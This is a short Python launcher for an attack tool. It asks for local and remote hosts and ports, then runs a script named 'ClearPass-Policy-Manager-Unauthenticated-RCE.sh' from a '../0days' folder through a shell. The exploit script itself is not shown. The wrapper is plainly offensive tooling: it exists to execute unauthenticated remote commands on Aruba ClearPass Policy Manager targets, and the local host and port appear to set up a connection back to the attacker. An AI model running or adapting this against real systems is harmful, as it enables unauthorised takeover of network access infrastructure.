import subprocess as sub


class Colors:
    red = '\033[38;2;255;0;0m\033m'
    purple = '\033[0;35m'
    green = '\033[0;32m'
    blue = '\033[34m'
    end = '\033[m'


def main():
    local_host = input(
        f"{Colors.red}(ClearPass Policy Manager Remote Command Execution){Colors.end} [Enter Local Host]:~#")
    local_port = int(
        input(f"{Colors.red}(ClearPass Policy Manager Remote Command Execution){Colors.end} [Enter Local Port]:~#"))
    remote_host = input(
        f"{Colors.red}(ClearPass Policy Manager Remote Command Execution){Colors.end} [Enter Remote Target]:~#")
    remote_port = int(
        input(f"{Colors.red}(ClearPass Policy Manager Remote Command Execution){Colors.end} [Enter Remote Port]:~#"))
    sub.call(
        f"bash -i ../0days/ClearPass-Policy-Manager-Unauthenticated-RCE.sh {remote_host} {remote_port} {local_host} {local_port}",
        shell=True)


if __name__ == "__main__":
    main()
